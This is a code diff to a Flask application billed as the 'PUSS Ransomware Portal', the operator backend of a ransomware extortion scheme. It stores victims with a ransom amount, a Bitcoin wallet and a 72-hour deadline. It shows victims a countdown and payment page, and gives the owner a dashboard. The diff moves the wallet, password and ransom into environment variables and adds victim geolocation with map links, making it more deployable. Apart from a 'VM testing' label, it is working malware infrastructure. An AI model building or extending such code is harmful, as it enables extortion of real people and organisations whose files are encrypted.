@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-PUSS RANSOMWARE PORTAL - Backend API with HTML Templates
+PUSS RANSOMWARE PORTAL - Complete Backend with All Templates
 FOR VM TESTING ONLY
 """
 
@@ -19,8 +19,19 @@ from flask_cors import CORS
 from functools import wraps
 
 app = Flask(__name__)
-app.secret_key = "40671Mps19*"
+app.secret_key = os.environ.get('SECRET_KEY', 'puss_vm_test_key_40671Mps19*')
 CORS(app)
+
+# ============================================================================
+# CONFIGURATION FROM ENVIRONMENT VARIABLES
+# ============================================================================
+
+class Config:
+    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD')
+    ADMIN_EMAIL = os.environ.get('ADMIN_EMAIL')
+    BTC_WALLET = os.environ.get('BTC_WALLET')
+    RANSOM_AMOUNT = os.environ.get('RANSOM_AMOUNT')
+    SERVER_URL = os.environ.get('SERVER_URL')
 
 # ============================================================================
 # DATA STORAGE
@@ -30,7 +41,7 @@ class PussDatabase:
     def __init__(self, db_file="puss_victims.json"):
         self.db_file = db_file
         self.victims = {}
-        self.owner_password = "40671Mps19*"
+        self.owner_password = Config.OWNER_PASSWORD
         self.load()
     
     def load(self):
@@ -46,18 +57,22 @@ class PussDatabase:
         with open(self.db_file, 'w') as f:
             json.dump({'victims': self.victims}, f, indent=2)
     
-    def add_victim(self, victim_id, files_count, hostname=None, ip=None):
+    def add_victim(self, victim_id, files_count, hostname=None, ip=None, country=None, city=None, lat=None, lon=None):
         self.victims[victim_id] = {
             'id': victim_id,
             'files_encrypted': files_count,
-            'ransom': "0.5 BTC",
-            'wallet': "1PussWalletVMTest",
+            'ransom': Config.RANSOM_AMOUNT,
+            'wallet': Config.BTC_WALLET,
             'status': 'unpaid',
             'payment_deadline': (datetime.now() + timedelta(hours=72)).isoformat(),
             'created_at': datetime.now().isoformat(),
             'decryption_key': self.generate_key(),
             'hostname': hostname or 'UNKNOWN',
-            'ip': ip or request.remote_addr,
+            'ip': ip or '0.0.0.0',
+            'country': country or 'Unknown',
+            'city': city or 'Unknown',
+            'lat': lat or 0,
+            'lon': lon or 0,
             'paid_at': None,
             'payment_tx': None
         }
@@ -80,6 +95,14 @@ class PussDatabase:
             return True
         return False
     
+    def update_victim_files(self, victim_id, files_count):
+        victim_id = victim_id.upper()
+        if victim_id in self.victims:
+            self.victims[victim_id]['files_encrypted'] = files_count
+            self.save()
+            return True
+        return False
+    
     def get_all_victims(self):
         return self.victims
     
@@ -87,19 +110,44 @@ class PussDatabase:
         total = len(self.victims)
         paid = sum(1 for v in self.victims.values() if v.get('status') == 'paid')
         unpaid = total - paid
-        total_btc = paid * 0.5
+        try:
+            amount = float(Config.RANSOM_AMOUNT.split()[0])
+            total_btc = paid * amount
+        except:
+            total_btc = paid * 0.5
         return {
             'total': total,
             'paid': paid,
             'unpaid': unpaid,
             'total_btc': total_btc,
-            'paid_btc': f"{total_btc:.2f}"
+            'paid_btc': f"{total_btc:.2f}",
+            'admin_email': Config.ADMIN_EMAIL
         }
+    
+    def delete_victim(self, victim_id):
+        victim_id = victim_id.upper()
+        if victim_id in self.victims:
+            del self.victims[victim_id]
+            self.save()
+            return True
+        return False
 
 db = PussDatabase()
 
 # ============================================================================
-# HTML TEMPLATES (EMBEDDED IN BACKEND)
+# LOGIN REQUIRED DECORATOR
+# ============================================================================
+
+def owner_login_required(f):
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        if not session.get('owner_logged_in'):
+            return jsonify({'error': 'Unauthorized'}), 401
+        return f(*args, **kwargs)
+    return decorated_function
+
+# ============================================================================
+# HTML TEMPLATES (EMBEDDED)
 # ============================================================================
 
 INDEX_HTML = """
@@ -225,6 +273,11 @@ INDEX_HTML = """
             0% { transform: translateY(-100%); }
             100% { transform: translateY(100%); }
         }
+        .map-link {
+            color: #ff6666;
+            font-size: 10px;
+            margin-top: 5px;
+        }
     </style>
 </head>
 <body>
@@ -280,11 +333,11 @@ INDEX_HTML = """
             const response = await fetch('/api/stats');
             const stats = await response.json();
             document.getElementById('stats').innerHTML = 
-                `Total Victims: ${stats.total} | Paid: ${stats.paid} | Unpaid: ${stats.unpaid} | Total BTC: ${stats.paid_btc}`;
+                `Total Victims: ${stats.total} | Paid: ${stats.paid} | Unpaid: ${stats.unpaid} | Total BTC: ${stats.paid_btc}<br>Contact: ${stats.admin_email}`;
         }
 
         function showOwnerLogin() {
-            document.body.innerHTML = \`
+            document.body.innerHTML = `
                 <div style="background:#0a0000; min-height:100vh; display:flex; justify-content:center; align-items:center;">
                     <div style="background:#1a0000; border:2px solid #ff0000; border-radius:10px; padding:40px; width:400px;">
                         <h2 style="color:#ff0000; text-align:center; margin-bottom:30px;">👑 OWNER LOGIN</h2>
@@ -298,7 +351,7 @@ INDEX_HTML = """
                         </div>
                     </div>
                 </div>
-            \`;
+            `;
         }
 
         async function ownerLogin() {
@@ -466,6 +519,12 @@ VICTIM_HTML = """
             font-family: monospace;
             margin: 10px 0;
         }
+        .map-link {
+            color: #66ccff;
+            font-size: 10px;
+            text-align: center;
+            margin-top: 5px;
+        }
     </style>
 </head>
 <body>
@@ -486,59 +545,78 @@ VICTIM_HTML = """
             const victim = await response.json();
             
             if (victim.status === 'paid') {
-                document.getElementById('content').innerHTML = \`
+                document.getElementById('content').innerHTML = `
                     <div class="status-paid">
                         <div style="font-size: 24px; margin-bottom: 10px;">✅ PAYMENT VERIFIED</div>
                         <div style="margin-bottom: 20px;">Your files can now be decrypted</div>
-                        <div class="decryption-key">\${victim.decryption_key}</div>
+                        <div class="decryption-key">${victim.decryption_key}</div>
                         <div style="color: #00ff00; font-size: 12px;">Use this key with the PUSS Decryptor tool</div>
                     </div>
-                \`;
+                `;
             } else {
                 const deadline = new Date(victim.payment_deadline);
                 const now = new Date();
                 const timeLeft = deadline - now;
                 const hours = Math.floor(timeLeft / (1000 * 60 * 60));
                 const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
                 const percentage = Math.min(100, Math.max(0, 100 - (timeLeft / (72 * 60 * 60 * 1000) * 100)));
                 
-                document.getElementById('content').innerHTML = \`
+                let locationHtml = '';
+                if (victim.lat && victim.lon && victim.lat !== 0) {
+                    locationHtml = `
+                        <div class="info-row">
+                            <span class="info-label">Location:</span>
+                            <span class="info-value">${victim.city}, ${victim.country}</span>
+                        </div>
+                        <div class="map-link">
+                            <a href="https://www.google.com/maps?q=${victim.lat},${victim.lon}" target="_blank">📍 View on map</a>
+                        </div>
+                    `;
+                }
+                
+                document.getElementById('content').innerHTML = `
                     <div class="timer-container">
                         <div class="timer-title">⏰ PAYMENT DEADLINE</div>
                         <div class="timer-bar">
-                            <div class="timer-fill" style="width: \${percentage}%"></div>
+                            <div class="timer-fill" style="width: ${percentage}%"></div>
                         </div>
-                        <div class="timer-text">\${hours}h \${minutes}m remaining</div>
+                        <div class="timer-text">${hours.toString().padStart(2,'0')}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}</div>
                     </div>
                     
                     <div class="info-box">
                         <div class="info-row">
                             <span class="info-label">Files Encrypted:</span>
-                            <span class="info-value">\${victim.files_encrypted}</span>
+                            <span class="info-value">${victim.files_encrypted}</span>
                         </div>
                         <div class="info-row">
                             <span class="info-label">Ransom Amount:</span>
-                            <span class="info-value">\${victim.ransom}</span>
+                            <span class="info-value">${victim.ransom}</span>
                         </div>
                         <div class="info-row">
                             <span class="info-label">Status:</span>
                             <span class="info-value" style="color: #ff0000;">UNPAID</span>
                         </div>
                         <div class="info-row">
+                            <span class="info-label">IP Address:</span>
+                            <span class="info-value">${victim.ip}</span>
+                        </div>
+                        ${locationHtml}
+                        <div class="info-row">
                             <span class="info-label">Created:</span>
-                            <span class="info-value">\${victim.created_at.slice(0,10)}</span>
+                            <span class="info-value">${victim.created_at.slice(0,10)}</span>
                         </div>
                     </div>
                     
                     <div class="payment-box">
                         <div style="font-size: 20px; margin-bottom: 10px;">💸 SEND PAYMENT</div>
-                        <div style="color: #ff9999; margin-bottom: 10px;">Send exactly \${victim.ransom} to:</div>
-                        <div class="wallet-address">\${victim.wallet}</div>
+                        <div style="color: #ff9999; margin-bottom: 10px;">Send exactly ${victim.ransom} to:</div>
+                        <div class="wallet-address">${victim.wallet}</div>
                         <div style="color: #ff6666; margin: 20px 0; font-size: 12px;">After payment, enter your transaction ID below</div>
                         <input type="text" id="tx_id" placeholder="Enter Transaction ID">
                         <button class="button" onclick="verifyPayment()">✅ VERIFY PAYMENT</button>
                     </div>
-                \`;
+                `;
             }
         }
 
@@ -580,7 +658,7 @@ OWNER_DASHBOARD_HTML = """
             color: #ff3333;
         }
         .container {
-            max-width: 1200px;
+            max-width: 1400px;
             margin: 0 auto;
             padding: 20px;
         }
@@ -621,21 +699,23 @@ OWNER_DASHBOARD_HTML = """
             background: #1a0000;
             border: 1px solid #ff0000;
             border-radius: 10px;
-            overflow: hidden;
+            overflow-x: auto;
         }
         .table-header {
             display: grid;
-            grid-template-columns: 1fr 1fr 1fr 1fr 1fr 1fr 1fr;
+            grid-template-columns: 0.8fr 0.8fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 0.8fr;
             background: #330000;
             padding: 15px;
             font-weight: bold;
             color: #ff6666;
+            min-width: 1200px;
         }
         .victim-row {
             display: grid;
-            grid-template-columns: 1fr 1fr 1fr 1fr 1fr 1fr 1fr;
+            grid-template-columns: 0.8fr 0.8fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr 0.8fr;
             padding: 15px;
             border-bottom: 1px solid #330000;
+            min-width: 1200px;
         }
         .victim-row:hover {
             background: #2a0000;
@@ -686,6 +766,19 @@ OWNER_DASHBOARD_HTML = """
             padding: 8px 15px;
             cursor: pointer;
         }
+        .map-link {
+            color: #66ccff;
+            font-size: 10px;
+            text-decoration: none;
+        }
+        .delete-btn {
+            background: #660000;
+            color: #ff6666;
+            border: none;
+            padding: 3px 8px;
+            cursor: pointer;
+            font-size: 11px;
+        }
     </style>
 </head>
 <body>
@@ -705,6 +798,8 @@ OWNER_DASHBOARD_HTML = """
             <input type="text" id="new_id" placeholder="Victim ID">
             <input type="number" id="new_files" placeholder="Files Count" value="1000">
             <input type="text" id="new_host" placeholder="Hostname">
+            <input type="text" id="new_country" placeholder="Country">
+            <input type="text" id="new_city" placeholder="City">
             <button onclick="addVictim()">ADD</button>
         </div>
         
@@ -714,8 +809,11 @@ OWNER_DASHBOARD_HTML = """
                 <div>FILES</div>
                 <div>HOSTNAME</div>
                 <div>IP</div>
+                <div>COUNTRY</div>
+                <div>CITY</div>
                 <div>DEADLINE</div>
                 <div>STATUS</div>
+                <div>MAP</div>
                 <div>ACTION</div>
             </div>
             <div id="victims-list"></div>
@@ -734,44 +832,51 @@ OWNER_DASHBOARD_HTML = """
             
             document.getElementById('datetime').innerText = new Date().toLocaleString();
             
-            document.getElementById('stats').innerHTML = \`
+            document.getElementById('stats').innerHTML = `
                 <div class="stat-card">
-                    <div class="stat-value">\${stats.total}</div>
+                    <div class="stat-value">${stats.total}</div>
                     <div class="stat-label">TOTAL VICTIMS</div>
                 </div>
                 <div class="stat-card">
-                    <div class="stat-value">\${stats.paid}</div>
+                    <div class="stat-value">${stats.paid}</div>
                     <div class="stat-label">PAID</div>
                 </div>
                 <div class="stat-card">
-                    <div class="stat-value">\${stats.unpaid}</div>
+                    <div class="stat-value">${stats.unpaid}</div>
                     <div class="stat-label">UNPAID</div>
                 </div>
                 <div class="stat-card">
-                    <div class="stat-value">\${stats.paid_btc}</div>
+                    <div class="stat-value">${stats.paid_btc}</div>
                     <div class="stat-label">BTC COLLECTED</div>
                 </div>
-            \`;
+            `;
             
             let html = '';
             for (const [id, victim] of Object.entries(victims)) {
-                html += \`
+                const mapLink = (victim.lat && victim.lon && victim.lat !== 0) 
+                    ? `<a href="https://www.google.com/maps?q=${victim.lat},${victim.lon}" target="_blank" class="map-link">📍 Map</a>`
+                    : 'N/A';
+                
+                html += `
                     <div class="victim-row">
-                        <div>\${id}</div>
-                        <div>\${victim.files_encrypted}</div>
-                        <div>\${victim.hostname}</div>
-                        <div>\${victim.ip}</div>
-                        <div>\${victim.payment_deadline.slice(0,10)}</div>
+                        <div>${id}</div>
+                        <div>${victim.files_encrypted}</div>
+                        <div>${victim.hostname}</div>
+                        <div>${victim.ip}</div>
+                        <div>${victim.country || 'Unknown'}</div>
+                        <div>${victim.city || 'Unknown'}</div>
+                        <div>${victim.payment_deadline.slice(0,10)}</div>
                         <div>
-                            <span class="status-badge \${victim.status === 'paid' ? 'status-paid' : 'status-unpaid'}">
-                                \${victim.status.toUpperCase()}
+                            <span class="status-badge ${victim.status === 'paid' ? 'status-paid' : 'status-unpaid'}">
+                                ${victim.status.toUpperCase()}
                             </span>
                         </div>
+                        <div>${mapLink}</div>
                         <div>
-                            <button class="status-badge" style="background:#ff0000;" onclick="deleteVictim('\${id}')">DELETE</button>
+                            <button class="delete-btn" onclick="deleteVictim('${id}')">DELETE</button>
                         </div>
                     </div>
-                \`;
+                `;
             }
             document.getElementById('victims-list').innerHTML = html;
         }
@@ -780,6 +885,8 @@ OWNER_DASHBOARD_HTML = """
             const id = document.getElementById('new_id').value;
             const files = document.getElementById('new_files').value;
             const host = document.getElementById('new_host').value;
+            const country = document.getElementById('new_country').value;
+            const city = document.getElementById('new_city').value;
             
             if (!id) {
                 alert('Enter Victim ID');
@@ -792,11 +899,16 @@ OWNER_DASHBOARD_HTML = """
                 body: JSON.stringify({
                     victim_id: id,
                     files: parseInt(files),
-                    hostname: host
+                    hostname: host,
+                    country: country,
+                    city: city
                 })
             });
             
             document.getElementById('new_id').value = '';
+            document.getElementById('new_host').value = '';
+            document.getElementById('new_country').value = '';
+            document.getElementById('new_city').value = '';
             loadDashboard();
         }
 
@@ -865,11 +977,13 @@ def api_owner_login():
     data = request.json
     password = data.get('password', '')
     if password == db.owner_password:
+        session['owner_logged_in'] = True
         return jsonify({'success': True})
     return jsonify({'success': False})
 
 @app.route('/api/owner/logout')
 def api_owner_logout():
+    session.pop('owner_logged_in', None)
     return jsonify({'success': True})
 
 @app.route('/api/stats')
@@ -886,24 +1000,41 @@ def api_add_victim():
     victim_id = data.get('victim_id', f"VM{random.randint(1000,9999)}").upper()
     files = data.get('files', random.randint(100, 9999))
     hostname = data.get('hostname', socket.gethostname())
+    country = data.get('country', 'Unknown')
+    city = data.get('city', 'Unknown')
+    lat = data.get('lat', 0)
+    lon = data.get('lon', 0)
+    ip = data.get('ip', request.remote_addr)
     
-    victim = db.add_victim(victim_id, files, hostname)
+    victim = db.add_victim(victim_id, files, hostname, ip, country, city, lat, lon)
     return jsonify(victim)
+
+@app.route('/api/update-victim', methods=['POST'])
+def api_update_victim():
+    data = request.json
+    victim_id = data.get('victim_id', '').upper()
+    files = data.get('files_encrypted', 0)
+    success = db.update_victim_files(victim_id, files)
+    return jsonify({'success': success})
 
 @app.route('/api/delete-victim/<victim_id>', methods=['DELETE'])
 def api_delete_victim(victim_id):
     victim_id = victim_id.upper()
-    if victim_id in db.victims:
-        del db.victims[victim_id]
-        db.save()
-        return jsonify({'success': True})
-    return jsonify({'success': False})
+    success = db.delete_victim(victim_id)
+    return jsonify({'success': success})
 
 # ============================================================================
-# UNIVERSAL CONTROL PANEL TOOL
+# UNIVERSAL CONTROL PANEL INTEGRATION
 # ============================================================================
 
-if control_panel_found:
+# Try to import universal control
+try:
+    from universal_control import Tool, Param
+    HAS_CONTROL = True
+except ImportError:
+    HAS_CONTROL = False
+
+if HAS_CONTROL:
     class PussPortalTool(Tool):
         name = "PUSS Ransomware Portal"
         description = "Tor-style ransomware payment portal"
@@ -935,16 +1066,13 @@ if __name__ == "__main__":
     print("=" * 60)
     print("🐱  PUSS RANSOMWARE PORTAL 🐱")
     print("=" * 60)
-    print("FOR VM TESTING ONLY")
-    print("\nOwner Password: 40671Mps19*")
-    print("\nAPI Running on: http://localhost:5000")
+    print(f"Owner Password: {Config.OWNER_PASSWORD}")
+    print(f"Admin Email: {Config.ADMIN_EMAIL}")
+    print(f"BTC Wallet: {Config.BTC_WALLET}")
+    print(f"Ransom Amount: {Config.RANSOM_AMOUNT}")
+    print("=" * 60)
+    print(f"Server URL: {Config.SERVER_URL}")
     print("=" * 60)
     
-    # Check if running with control panel
-    if control_panel_found and len(sys.argv) > 1 and sys.argv[1] == "--control":
-        tool = PussPortalTool()
-        tool.run()
-    else:
-        # Run standalone
-        port = int(os.environ.get('PORT', 5000))
-        app.run(host='0.0.0.0', port=port, debug=True)
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=False)
